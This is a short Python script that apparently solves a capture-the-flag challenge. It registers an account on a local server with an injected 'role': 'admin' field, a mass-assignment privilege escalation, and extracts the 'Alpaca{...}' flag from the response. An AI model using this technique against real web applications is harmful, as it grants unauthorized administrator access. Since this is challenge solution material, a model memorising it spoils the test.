import os
import time
import requests
import re
import random

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 3000))
URL = f"http://{HOST}:{PORT}/"


response = requests.post(f"{URL}register", data={
    "username": random.randbytes(16).hex(),
    "password": "password",
    "role": "admin"
})
print(response.text)
print(re.findall(r"Alpaca{.+}", response.text)[0])

